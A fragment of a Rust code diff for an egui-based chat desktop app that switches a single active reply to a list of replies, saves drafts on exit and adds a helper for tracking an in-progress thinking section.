         // `minimized` puts the self-portrait's window down once its message is sent, and back up when the reply ends.
         if self.staged("minimized") && self.shot.as_ref().is_some_and(|shot| shot.acted) {
-            ctx.send_viewport_cmd(egui::ViewportCommand::Minimized(self.run.is_some()));
+            ctx.send_viewport_cmd(egui::ViewportCommand::Minimized(!self.runs.is_empty()));
         }
     }
 
     fn on_exit(&mut self, _gl: Option<&eframe::glow::Context>) {
+        drafts::keep(self, true);
         // Chats are written by another thread: the last save has to land before the program goes. Listed once
         // more after it, they leave the kept list with the size and time each file really ended at, so the next
         // start reads none of them.
@@ -1780,7 +1973,7 @@ impl eframe::App for App {
         if !self.boot.as_ref().is_some_and(|boot| boot.loading()) {
             self.shortcuts(&ctx);
         }
-        if self.run.is_some() || self.summary_job.is_some() {
+        if !self.runs.is_empty() || self.summary_job.is_some() {
             // Keeps the elapsed time moving between tokens.
             ctx.request_repaint_after(Duration::from_millis(120));
         }
@@ -1881,7 +2074,7 @@ impl eframe::App for App {
             *TOLD.lock().unwrap() = Some(Instant::now());
             let doing = if self.opening.is_some() {
                 "opening a chat"
-            } else if self.run.is_some() {
+            } else if !self.runs.is_empty() {
                 "during a reply"
             } else if self.dialog != Dialog::None {
                 "in a dialog"
@@ -1895,8 +2088,8 @@ impl eframe::App for App {
         static LAST: std::sync::Mutex<Option<Instant>> = std::sync::Mutex::new(None);
         if PERF.is_some() {
             let since = LAST.lock().unwrap().replace(frame_started).map_or(0.0, |last| frame_started.duration_since(last).as_secs_f64() * 1000.0);
-            if since > 40.0 && self.run.is_some() {
-                eprintln!("gap {since:.0} ms ({})", self.run.as_ref().map_or("", |run| run.status));
+            if let Some(run) = self.runs.first().filter(|_| since > 40.0) {
+                eprintln!("gap {since:.0} ms ({})", run.status);
             }
             // Both are kept for the summary printed when the program leaves: how long the app took to lay a frame
             // out, and how long it was from one frame to the next, which is what the eye gets.
@@ -2044,6 +2237,15 @@ fn write_text(msg: &mut Message, watch: &mut Stopwatch, prose: bool, text: Strin
         }
     }
 }
+
+/// The reply is in the middle of a thought.
+fn thinking_now(msg: &Message) -> bool {
+    matches!(msg.parts.last(), Some(Part::Thinking { ms: 0, .. }))
+}
+
+/// How long a step held back by a thought that was just shut waits: most of the fold, so it starts coming in as
+/// the fold settles.
+const FOLD_WAIT: Duration = Duration::from_millis((widgets::FOLD * 800.0) as u64);
 
 fn close_thinking(msg: &mut Message, watch: &mut Stopwatch) {
     if let Some(Part::Thinking { ms: ms @ 0, .. }) = msg.parts.last_mut() {
